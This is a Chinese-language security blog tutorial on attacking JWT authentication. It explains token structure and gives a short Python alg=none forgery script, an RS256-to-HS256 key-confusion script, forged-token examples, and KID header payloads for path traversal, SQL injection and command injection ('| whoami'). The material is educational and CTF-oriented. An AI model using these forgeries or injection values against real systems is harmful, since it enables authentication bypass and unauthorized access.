<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="信息安全研究方向，目前着力于Web安全与渗透测试，向往Open、Free、Share的黑客精神。同时也是一名业余ctfer。"><title>JWT鉴权攻击 | zjun's blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=1.0.0"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/normalize.css/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/pure-min.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = 'https://hm.baidu.com/hm.js?' + '2bd5b990e2605fea321851cd73e77f93';
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(hm, s);
  })();
</script><script type="text/javascript" src="//cdn.jsdelivr.net/npm/clipboard/dist/clipboard.min.js"></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.js"></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.css"><meta name="generator" content="Hexo 5.3.0"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">JWT鉴权攻击</h1><a id="logo" href="/.">zjun's blog</a><p class="description">潜心习安全</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/tags/"><i class="fa fa-tags"> 标签</i></a><a href="/timeline/"><i class="fa fa-history"> 时间线</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a target="_blank" rel="noopener" href="https://tools.zjun.info/"><i class="fa fa-cube"> Tools</i></a><a target="_blank" rel="noopener" href="https://github.com/z1un"><i class="fa fa-github"> Github</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">JWT鉴权攻击</h1><div class="post-meta">2021-02-15<span> | </span><span class="category"><a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></span></div><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">文章目录</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#JWT%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"><span class="toc-number">1.</span> <span class="toc-text">JWT数据结构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Header"><span class="toc-number">1.1.</span> <span class="toc-text">Header</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload"><span class="toc-number">1.2.</span> <span class="toc-text">Payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Signature"><span class="toc-number">1.3.</span> <span class="toc-text">Signature</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JWT%E6%94%BB%E5%87%BB%E5%AE%9E%E7%8E%B0"><span class="toc-number">2.</span> <span class="toc-text">JWT攻击实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F"><span class="toc-number">2.1.</span> <span class="toc-text">敏感信息泄漏</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9B%B4%E6%94%B9%E7%AD%BE%E5%90%8D%E7%AE%97%E6%B3%95"><span class="toc-number">2.2.</span> <span class="toc-text">更改签名算法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%86alg%E8%AE%BE%E7%BD%AE%E4%B8%BANone"><span class="toc-number">2.2.1.</span> <span class="toc-text">将alg设置为None</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%86alg%E7%94%B1RS256%E6%9B%B4%E6%94%B9%E4%B8%BAHS256"><span class="toc-number">2.2.2.</span> <span class="toc-text">将alg由RS256更改为HS256</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E6%95%88%E7%AD%BE%E5%90%8D"><span class="toc-number">2.3.</span> <span class="toc-text">无效签名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E7%AD%BE%E5%90%8D%E5%AF%86%E9%92%A5"><span class="toc-number">2.4.</span> <span class="toc-text">爆破签名密钥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E9%92%A5%E6%B3%84%E9%9C%B2"><span class="toc-number">2.5.</span> <span class="toc-text">密钥泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E6%8E%A7%E5%A4%B4%E9%83%A8%E5%8F%82%E6%95%B0"><span class="toc-number">2.6.</span> <span class="toc-text">可控头部参数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#KID%E5%A4%B4%E9%83%A8%E5%8F%82%E6%95%B0"><span class="toc-number">2.6.1.</span> <span class="toc-text">KID头部参数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-number">2.6.1.1.</span> <span class="toc-text">目录遍历</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.6.1.2.</span> <span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">2.6.1.3.</span> <span class="toc-text">命令注入</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JKU%E5%A4%B4%E9%83%A8%E5%8F%82%E6%95%B0"><span class="toc-number">2.6.2.</span> <span class="toc-text">JKU头部参数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JWK%E5%A4%B4%E9%83%A8%E5%8F%82%E6%95%B0"><span class="toc-number">2.6.3.</span> <span class="toc-text">JWK头部参数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#X5U%E3%80%81X5C-URL%E6%93%8D%E4%BD%9C"><span class="toc-number">2.6.4.</span> <span class="toc-text">X5U、X5C URL操作</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">3.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="post-content"><p>Json Web Token简称JWT，是一种基于json格式传输信息的token鉴权方式。目前应用较为广泛，Web登陆认证以及CTF中也时常遇到。由于它的无状态和签名方式，因此存在一些特定于JWT的安全性问题。这篇文章介绍几种JWT鉴权攻击方法。</p>
<a id="more"></a>

<h2 id="JWT数据结构"><a href="#JWT数据结构" class="headerlink" title="JWT数据结构"></a>JWT数据结构</h2><p>JWT由三部分组成，这些部分中间以<code>.</code>号分隔，分别是：</p>
<ul>
<li>Header（头部）</li>
<li>Payload（有效载荷）</li>
<li>Signature（签名）</li>
</ul>
<p>因此JWT通常格式为:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64UrlEncode(Header). base64UrlEncode(Payload).Signature</span><br></pre></td></tr></table></figure>
<p>其中Header与Payload以明文经Base64Url编码存储。</p>
<p>一段在 <a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a> 生成的JWT如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6InpqdW4iLCJpYXQiOjE1MTYyMzkwMjJ9.nND9JmdF_kAXhJuJkGo8ss_Fx34zpY8xGt6FcB6qFIc</span><br></pre></td></tr></table></figure>
<p>下面让我们将其分解加以解析。</p>
<h3 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h3><p>Header通常由两部分组成：令牌的类型<code>typ</code>（即JWT）和所使用的签名算法<code>alg</code>（例如HS256、RS256）。</p>
<p>上面一段JWT的第一部分是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><br></pre></td></tr></table></figure>
<p>经Base64Url解码如下：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p>Payload用来承载要传递的数据，它的json结构实际上是对JWT要传递的数据的一组声明，这些声明被JWT标准称为claims，它的一个”属性值对“就是一个claim，每一个claim都代表特定的含义和作用。</p>
<p>claims有三种类型分别是：Registered claims、Public claims、Private claims。</p>
<p>详细可见：<a target="_blank" rel="noopener" href="https://jwt.io/introduction/">https://jwt.io/introduction/</a></p>
<p>上面一段JWT的第二部分是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6InpqdW4iLCJpYXQiOjE1MTYyMzkwMjJ9</span><br></pre></td></tr></table></figure>
<p>经Base64Url解码如下：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;sub&quot;</span>: <span class="string">&quot;1234567890&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;zjun&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;iat&quot;</span>: <span class="number">1516239022</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h3><p>要创建签名部分，必须获取编码的header，编码的payload，加密密钥（secret），header中指定的算法，并对其进行签名。</p>
<p>例如，如果要使用<code>HS256</code>算法，则将通过以下方式创建签名：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + <span class="string">&quot;.&quot;</span> +</span><br><span class="line">  base64UrlEncode(payload),</span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure>
<p>签名用于验证数据在发送过程中没有被篡改。</p>
<p>上面一段JWT的signature部分是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nND9JmdF_kAXhJuJkGo8ss_Fx34zpY8xGt6FcB6qFIc</span><br></pre></td></tr></table></figure>
<h2 id="JWT攻击实现"><a href="#JWT攻击实现" class="headerlink" title="JWT攻击实现"></a>JWT攻击实现</h2><h3 id="敏感信息泄漏"><a href="#敏感信息泄漏" class="headerlink" title="敏感信息泄漏"></a>敏感信息泄漏</h3><p>通过JWT数据结构的分析，显然可知：header与payload是以明文经Base64Url编码传输的，因此，如果payload中存在敏感信息的话，就会发生信息泄露。</p>
<h3 id="更改签名算法"><a href="#更改签名算法" class="headerlink" title="更改签名算法"></a>更改签名算法</h3><p>JWT签名算法用以防止用户篡改其中的数据。例如使用HMAC或RSA签名。JWT的header包含用于对JWT进行签名的算法，某些算法的一个缺点是，即使客户端可以操纵它，它们也信任此JWT标头。如果存在此漏洞，则客户端可以创建自己的令牌。</p>
<h4 id="将alg设置为None"><a href="#将alg设置为None" class="headerlink" title="将alg设置为None"></a>将alg设置为None</h4><p>签名算法可以确保JWT在传输过程中不会被恶意用户所篡改。但header头部中的<code>alg</code>字段却可以改为<code>none</code>。另外，一些JWT库也支持<code>none</code>算法，即不使用签名算法。将<code>alg</code>设置为<code>none</code>，告诉服务器不进行签名校验。</p>
<p>将alg字段改为none后，系统就会从JWT中删除相应的签名数据。这时，JWT就是<code> base64UrlEncode(header). base64UrlEncode(payload).</code>，然后将其提交给服务器。</p>
<p>一个演示项目实例：<a target="_blank" rel="noopener" href="https://github.com/Sjord/jwtdemo">https://github.com/Sjord/jwtdemo</a></p>
<p>HS256演示页面：<a target="_blank" rel="noopener" href="http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php">http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php</a></p>
<p>Exploit:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># header</span></span><br><span class="line"><span class="comment"># eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span></span><br><span class="line"><span class="comment"># &#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;</span></span><br><span class="line"><span class="comment"># payload eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTYxMzM1OTI1OSwiZXhwIjoxNjEzMzYwNDU5LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0</span></span><br><span class="line"><span class="comment"># &#123;&quot;iss&quot;: &quot;http://demo.sjoerdlangkemper.nl/&quot;,&quot;iat&quot;: 1613359259,&quot;exp&quot;: 1613360459,&quot;data&quot;: &#123;&quot;hello&quot;: &quot;world&quot;&#125;&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b64urlencode</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(data).replace(<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;-&#x27;</span>).replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;_&#x27;</span>).replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> b64urlencode(<span class="string">&quot;&#123;\&quot;typ\&quot;:\&quot;JWT\&quot;,\&quot;alg\&quot;:\&quot;none\&quot;&#125;&quot;</span>) + \</span><br><span class="line">    <span class="string">&#x27;.&#x27;</span> + b64urlencode(<span class="string">&quot;&#123;\&quot;data\&quot;:\&quot;test\&quot;&#125;&quot;</span>) + <span class="string">&#x27;.&#x27;</span></span><br></pre></td></tr></table></figure>
<p>传入后结果如下，通过验证：</p>
<p><img src="https://oss.zjun.info/zjun.info/20210215000306.png" alt="alg=none"></p>
<h4 id="将alg由RS256更改为HS256"><a href="#将alg由RS256更改为HS256" class="headerlink" title="将alg由RS256更改为HS256"></a>将alg由RS256更改为HS256</h4><p>HS256算法使用密钥来为每个消息进行签名和验证。RS256算法使用私钥对消息进行签名，并使用公钥进行验证。如果我们将算法从RS256更改为HS256，则将使用公钥作为私钥使用HS256算法验证签名，则后端代码使用RSA公钥+HS256算法进行签名验证。由于公钥是公开的，因此我们可以正确签署这类消息。</p>
<p>相同，我们也可以使用演示实例：<a target="_blank" rel="noopener" href="https://github.com/Sjord/jwtdemo">https://github.com/Sjord/jwtdemo</a></p>
<p>RS256演示页面：<a target="_blank" rel="noopener" href="http://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php">http://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php</a></p>
<p>RSA公钥：<a target="_blank" rel="noopener" href="http://demo.sjoerdlangkemper.nl/jwtdemo/public.pem">http://demo.sjoerdlangkemper.nl/jwtdemo/public.pem</a></p>
<p>Exploit:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="comment"># eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9</span></span><br><span class="line"><span class="comment"># &#123;&quot;typ&quot;: &quot;JWT&quot;,&quot;alg&quot;: &quot;RS256&quot;&#125;</span></span><br><span class="line"><span class="comment"># eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTYxMzM1OTA5NiwiZXhwIjoxNjEzMzYwMjk2LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0</span></span><br><span class="line"><span class="comment"># &#123;&quot;iss&quot;: &quot;http://demo.sjoerdlangkemper.nl/&quot;,&quot;iat&quot;: 1613359096,&quot;exp&quot;: 1613360296,&quot;data&quot;: &#123;&quot;hello&quot;: &quot;world&quot;&#125;&#125;</span></span><br><span class="line">public = <span class="built_in">open</span>(<span class="string">&#x27;public.pem&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="built_in">print</span> jwt.encode(&#123;<span class="string">&quot;data&quot;</span>:<span class="string">&quot;test&quot;</span>&#125;, key=public, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>理论可行，但是实际未成功，可能是公钥处理的问题。</p>
<h3 id="无效签名"><a href="#无效签名" class="headerlink" title="无效签名"></a>无效签名</h3><p>当用户端提交请求给应用程序，服务端可能没有对签名部分进行校验，这样，攻击者便可以通过提供无效签名简单地绕过安全机制，当然这种情况极少。</p>
<p>下面一段JWT：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidGVzdCIsImFjdGlvbiI6InByb2ZpbGUifQ.FjnAvQxzRKcahlw2EPd9o7teqX-fQSt7MZhT84hj7mU</span><br></pre></td></tr></table></figure>
<p>payload部分为</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;user&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;action&quot;</span>: <span class="string">&quot;profile&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>若存在无效签名的话，即直接修改user字段，便可伪造其他用户：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJhY3Rpb24iOiJwcm9maWxlIn0._LRRXAfXtnagdyB1uRk-7CfkK1RESGwxqQCdwCNSPaI</span><br></pre></td></tr></table></figure>
<h3 id="爆破签名密钥"><a href="#爆破签名密钥" class="headerlink" title="爆破签名密钥"></a>爆破签名密钥</h3><p>针对于HS256对称加密算法，如果HS256密钥的强度较弱的话，攻击者可以直接通过暴力破解的攻击方式来得到密钥。具体方法很简单：如果密钥正确的话，解密就会成功；如果密钥错误的话，解密代码就会抛出异常。</p>
<p>例如CISCN2019 华北赛区 Day1 Web2 ikun一题中就有利用爆破JWT密钥进行伪造token。</p>
<p>解题过程见：<a href="https://blog.zjun.info/2019/ikun.html">https://blog.zjun.info/2019/ikun.html</a></p>
<p>爆破工具：<a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a>、<a target="_blank" rel="noopener" href="https://github.com/ticarpi/jwt_tool">jwt_tool</a>或<a target="_blank" rel="noopener" href="https://github.com/Ch1ngg/JWTPyCrack">JWTPyCrack</a></p>
<p>在线JWT加解密网站：<a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a></p>
<h3 id="密钥泄露"><a href="#密钥泄露" class="headerlink" title="密钥泄露"></a>密钥泄露</h3><p>假设攻击者无法暴力破解密钥，那么他可能通过其他途径获取密钥，如git信息泄露、目录遍历，任意文件读取、XXE漏洞等，从而伪造任意token签名。</p>
<h3 id="可控头部参数"><a href="#可控头部参数" class="headerlink" title="可控头部参数"></a>可控头部参数</h3><h4 id="KID头部参数"><a href="#KID头部参数" class="headerlink" title="KID头部参数"></a>KID头部参数</h4><p>KID代表”密钥ID”即”Key ID”。它是JWT中的可选头部字段，它使开发人员可以指定用于验证token的密钥。KID参数的正确用法如下所示：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;alg&quot;：&quot;HS256&quot;,</span><br><span class="line">	&quot;typ&quot;：&quot;JWT&quot;,</span><br><span class="line">	&quot;kid&quot;：&quot;1&quot;	//使用密钥1来验证令牌</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于此字段是由用户控制的，因此攻击者可能会操纵它并导致危险的后果。</p>
<h5 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h5><p>由于KID通常用于从文件系统中检索密钥文件，因此，如果在使用前未对其进行清理，则可能导致目录遍历攻击。在这种情况下，攻击者将能够在文件系统中指定任何文件作为用于验证令牌的密钥。</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;kid&quot;: &quot;../../public/css/main.css&quot;</span><br><span class="line"><span class="comment">//使用公共文件main.css验证token</span></span><br></pre></td></tr></table></figure>
<p>例如，攻击者可以迫使应用程序使用公开可用的文件作为密钥，并使用该文件对HMAC令牌进行签名。</p>
<h5 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h5><p>KID还可以用于从数据库检索密钥。在这种情况下，可能可以利用SQL注入来绕过JWT签名。如果可以在KID参数上进行SQL注入，则攻击者可以使用该注入返回她想要的任何值。</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;kid&quot;:&quot;aaaaaaa&#x27; UNION SELECT &#x27;key&#x27;;--&quot;</span><br><span class="line"><span class="comment">//使用字符串&quot;key&quot;验证token</span></span><br></pre></td></tr></table></figure>
<p>例如，上面的注入将使应用程序返回字符串”key”（因为数据库中不存在名为”aaaaaaa”的键）。然后将使用字符串”key”作为密钥来验证令牌。</p>
<h5 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h5><p>有时，当KID参数直接传递到不安全的文件读取操作中时，可以将命令注入代码流中。</p>
<p>可能允许这种类型的攻击的函数之一是<code>Ruby open()</code>函数。此功能使攻击者只需在KID文件名之后将命令添加到输入即可，即可执行系统命令：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;key_file&quot; | whoami;</span><br></pre></td></tr></table></figure>
<p>这只是一个例子。从理论上讲，每当应用程序将未经过滤审查的任何头文件参数传递给类似于<code>system()</code>，<code>exec()</code>等的任何函数时，就会发生此类漏洞。</p>
<h4 id="JKU头部参数"><a href="#JKU头部参数" class="headerlink" title="JKU头部参数"></a>JKU头部参数</h4><p>JWKSet URL即JKU。它是一个可选的头部字段，用于指定指向一组用于验证token密钥的URL。如果允许该字段，并且没有适当地限制此字段，则攻击者可以托管自己的密钥文件，并指定应用程序使用它来验证token。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jku URL-&gt;包含JWK集的文件-&gt;用于验证token的JWK</span><br></pre></td></tr></table></figure>
<h4 id="JWK头部参数"><a href="#JWK头部参数" class="headerlink" title="JWK头部参数"></a>JWK头部参数</h4><p>可选的JWK（JSON Web Key）标头参数允许攻击者将用于验证token的密钥直接嵌入token中。</p>
<h4 id="X5U、X5C-URL操作"><a href="#X5U、X5C-URL操作" class="headerlink" title="X5U、X5C URL操作"></a>X5U、X5C URL操作</h4><p>类似于JKU和JWK头部参数，X5U和X5C标头参数允许攻击者指定用于验证token的公钥证书或证书链。X5U以URI形式指定信息，而X5C允许将证书值嵌入token中。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><p><a target="_blank" rel="noopener" href="https://jwt.io/introduction/">https://jwt.io/introduction/</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/">https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2338">https://xz.aliyun.com/t/2338</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/JSON_Web_Token">https://en.wikipedia.org/wiki/JSON_Web_Token</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a">https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a</a></p>
</li>
</ul>
</div><div id="donate"><link rel="stylesheet" type="text/css" href="/css/donate.css"><script type="text/javascript" src="/js/donate.js" successtext="复制成功!"></script><a class="pos-f tr3" id="github" target="_blank" rel="noopener" href="https://github.com/z1un" arget="_blank" title="Github"></a><div id="DonateText">Donate</div><ul class="list pos-f" id="donateBox"><li id="AliPay" qr="/img/AliPayQR.png"></li><li id="WeChat" qr="/img/WeChatQR.png"></li></ul><div class="pos-f left-100" id="QRBox"><div id="MainBox"></div></div></div><div class="post-copyright"><script type="text/javascript" src="/js/copyright.js" successtext="复制成功!"></script><link rel="stylesheet" type="text/css" href="/css/copyright.css"><p><span>本文标题：</span>JWT鉴权攻击</p><p><span>文章作者：</span>zjun</p><p><span>发布时间：</span>2021-02-15</p><!--p--><!--    span= __('copyright_update_prefix')--><!--    = page.updated.format(config.date_format)--><p><span>原始链接：</span><a href="/2021/attacking-jwt-authentication.html">https://blog.zjun.info/2021/attacking-jwt-authentication.html</a><span class="copy-path"><i class="fa fa-clipboard" data-clipboard-text="https://blog.zjun.info/2021/attacking-jwt-authentication.html"></i></span></p><p><span>版权声明：</span>本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0 CN</a> 许可协议。转载请注明出处！</p></div><br><script type="text/javascript" src="/js/share.js?v=1.0.0" async></script><a class="article-share-link" data-url="https://blog.zjun.info/2021/attacking-jwt-authentication.html" data-id="ckl994hse000jzyrygwntg24z" data-qrcode="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACLklEQVR42u3aO27DMBAFQN//0g6QKkBi5b2lXJgcVYFsmRwVG+7n8Yiv5/f16v7vT3/eefVs/mu3XRgYGB/LeF5e+bZePZvzXq17vTcMDIxzGMmS18vkW2nXjf4BYGBgYJTB8fpFtL+JgYGBcVfAzRPdFo+BgYGRJ7E5oC2cJcjbcnEMDIwPZKwv876/39jfwMDA+BDGs7xm1OS4ubQrDAyMrRnXZa8kdcwDZXv4awtwGBgYuzLaYv0s+CYnuva1/hFqMTAwDmCsbLE98LXfHLYEMDAwtmCsHP5WRsTaslqCx8DA2JvRFuLvAsxy7qLchoGBsQVjlrLOBilyUt1mwMDAOJgxK6jNxrbaI2MRcDEwMD6ckaSvbUDMC20rxTUMDIxzGLm1HYaYjZe1Yx8YGBjnMPKBreT+vZ2KCIaBgbE1YzYqsTIk0Yb4goSBgXEAIwmjK0fGu1LffwIuBgbGdoz8YJeUw1bGWJMEOGphYmBgbMdoG4pJAG2T29koWNQixcDA2ILRhsWWMWsSDLuvGBgYWzOS0atZctu2OfMBsqgTi4GBsQVjFl5Xxrzy79RPYWBgbMpYP8atzDwkLYHoUwwMjK0ZbbBrC2SzElvbNsDAwDiBkQTZldGxtjmal+QwMDBOY+SHvFmRro7xK6MVGBgYBzNmYxZtUpqMaxSNTAwMjIMZeZszD9xLh04MDIwDGLMNzdqWN49ZYGBgHMBYaUwmvLZtedeLw8DA2ILxBWKZS6mv1Hh4AAAAAElFTkSuQmCC">分享</a>